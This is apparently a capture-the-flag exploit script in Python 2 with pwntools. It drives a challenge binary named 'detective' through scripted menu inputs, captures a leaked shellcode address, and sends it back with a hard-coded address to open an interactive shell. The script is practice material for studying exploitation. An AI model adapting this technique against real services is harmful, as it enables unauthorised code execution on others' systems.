from pwn import * 


context.log_level = True

local=False

if local:

    r = process("./detective",shell=True)
    pause()

else:

    HOST = "localhost"
    PORT = 4444
    r = remote(HOST,PORT)
    pause()

#=========================================================

#SET REPORT
#SET REPORT
r.recvuntil("$")
r.sendline("2")
r.recvuntil(":")
r.sendline("DORY")
r.recvuntil(":")
r.sendline("40")
r.recvuntil(":")
r.sendline("40")

#SEND REPORT
r.recvuntil("$")
r.sendline("5")
r.recvuntil("$")
r.sendline("y")

#FIRST ROW
r.recvuntil("$")
count = 0
while (count < 3):
    r.sendline("1")
    r.recvuntil("$")
    count += 1

r.sendline("4")
r.recvuntil("$")
r.sendline("1")
r.recvuntil("$")
r.sendline("Q")

#RESET
r.recvuntil("$")
r.sendline("R")


#SECOND ROW
r.recvuntil("$")
r.sendline("2")

count = 0
while (count < 3):
    r.recvuntil("$")
    r.sendline("1")
    count += 1

r.recvuntil("$")
r.sendline("4")
r.recvuntil("$")
r.sendline("2")
r.recvuntil("$")
r.sendline("Q")

#RESET
r.recvuntil("$")
r.sendline("R")

#THIRD ROW
r.recvuntil("$")

count = 0
while(count < 4):
        r.sendline("1")
        r.recvuntil("$")
        count += 1

r.sendline("4")
r.recvuntil("$")
r.sendline("3")
r.recvuntil("$")
r.sendline("Q")

#RESET
r.recvuntil("$")
r.sendline("R")

#FOURTH ROW
r.recvuntil("$")
r.sendline("2")
r.recvuntil("$")
r.sendline("2")
r.recvuntil("$")

r.sendline("4")
r.recvuntil("$")
r.sendline("4")
r.recvuntil("$")
r.sendline("Q")

#RESET
r.recvuntil("$")
r.sendline("R")

#FIFTH ROW
r.recvuntil("$")

count = 0
while(count < 9):
        r.sendline("1")
        r.recvuntil("$")
        count += 1

r.sendline("4")
r.recvuntil("$")
r.sendline("5")

#EXPLOIT
r.recvuntil("$")
r.sendline("S")
r.recvuntil(":")

shellcode = r.recvline()[3:]

print "SHELLCODE ADDRESS:",shellcode

r.recvuntil("$")

r.sendline(shellcode)
r.recvuntil("$")
r.sendline("f7e19950")
r.interactive()
